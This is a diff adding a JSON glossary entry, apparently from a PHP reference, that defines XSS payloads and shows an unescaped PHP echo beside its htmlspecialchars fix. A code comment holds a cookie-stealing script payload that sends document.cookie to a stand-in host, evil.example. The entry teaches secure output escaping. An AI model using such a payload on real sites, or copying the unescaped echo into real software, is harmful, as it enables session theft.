@@ -1,0 +1,54 @@
+{
+    "id": "xss-payload",
+    "name": "XSS Payload",
+    "url": "https://php-dictionary.readthedocs.io/en/latest/index/xss-payload.html",
+    "aliases": [],
+    "description": "An XSS payload is the malicious script or markup that an attacker injects into a vulnerable application to carry out a cross-site scripting attack.\n\nThe payload is crafted to execute in the victim's browser once the vulnerable page reflects or stores it without proper escaping. Payloads range from a simple ``<script>alert(1)</script>`` used to prove the vulnerability exists, to more advanced code that steals cookies, hijacks sessions, or performs actions on behalf of the victim.\n\nPenetration testers and security scanners maintain lists of XSS payloads, including obfuscated and context-specific variants, to test whether an application's input handling and output escaping properly neutralise them.",
+    "code": "<?php\n\n    // Unescaped output lets the payload execute in the browser\n    echo '<div>' . $_GET['comment'] . '</div>';\n    // payload example: <script>document.location='https://evil.example/steal?c='+document.cookie</script>\n\n    // Escaping neutralises the payload\n    echo '<div>' . htmlspecialchars($_GET['comment'], ENT_QUOTES) . '</div>';\n\n?>",
+    "documentation": "https://owasp.org/www-community/attacks/xss/",
+    "related": [
+        "xss",
+        "stored-xss",
+        "payload",
+        "pentest",
+        "htmlspecialchars",
+        "vulnerability"
+    ],
+    "citations": [
+        {
+            "@type": "CreativeWork",
+            "name": "Documentation",
+            "url": "https://owasp.org/www-community/attacks/xss/"
+        },
+        {
+            "@type": "CreativeWork",
+            "name": "PortSwigger XSS Cheat Sheet",
+            "url": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+        },
+        {
+            "@type": "CreativeWork",
+            "name": "OWASP XSS Filter Evasion Cheat Sheet",
+            "url": "https://owasp.org/www-community/xss-filter-evasion-cheatsheet"
+        }
+    ],
+    "tags": [
+        "security",
+        "vulnerability"
+    ],
+    "packagist": [],
+    "extensions": [],
+    "analyzers": [],
+    "cobblers": [],
+    "rule": "",
+    "phpVersionSince": "",
+    "phpVersionUntil": "",
+    "phpVersionDeprecated": "",
+    "phpErrors": [
+        ""
+    ],
+    "changedBehavior": "",
+    "author": "",
+    "brand": "",
+    "popularity": "",
+    "modified": "Sun, 16 Aug 2026 07:54:45 +0000"
+}
